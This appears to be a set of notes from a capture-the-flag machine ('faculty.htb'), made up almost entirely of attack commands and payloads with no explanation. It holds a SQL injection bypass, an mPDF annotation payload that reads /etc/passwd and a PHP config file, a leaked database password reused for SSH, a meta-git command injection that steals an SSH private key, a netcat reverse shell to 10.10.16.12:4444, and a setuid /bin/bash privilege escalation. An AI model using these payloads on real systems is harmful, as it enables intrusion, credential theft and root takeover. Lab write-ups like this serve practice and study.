```sql
1' or 1 = '1
```

https://github.com/mpdf/mpdf/issues/356

```
The PDF is dark and full of attachments  
 <annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

file:///usr/share/webapps/cyberchef/index.html#recipe=URL_Encode(true)To_Base64('A-Za-z0-9%2B/%3D')&input=VGhlIFBERiBpcyBkYXJrIGFuZCBmdWxsIG9mIGF0dGFjaG1lbnRzICAKIDxhbm5vdGF0aW9uIGZpbGU9Ii9ldGMvcGFzc3dkIiBjb250ZW50PSIvZXRjL3Bhc3N3ZCIgIGljb249IkdyYXBoIiB0aXRsZT0iQXR0YWNoZWQgRmlsZTogL2V0Yy9wYXNzd2QiIHBvcy14PSIxOTUiIC8%2B

```
root:x:0:0:root:/root:/bin/bash  
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash  
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

```
The PDF is dark and full of attachments  
 <annotation file="/var/www/scheduling/admin/db_connect.php" content="id_rsa"  icon="Graph" title="Attached File:id_rsa" pos-x="195" />
```

```
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

```
ssh gbyolo@faculty.htb
Co.met06aci.dly53ro.per
```

```
/var/mail/gbyolo
```

```
sudo -u developer meta-git clone 'asd | cat ~/.ssh/id_rsa'
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.12 4444 >/tmp/f
python3 -m pwncat -lp 4444 -m linux
```

```
ps aux | grep "root" | grep python
```

```
call (void)system("chmod u+s /bin/bash")
```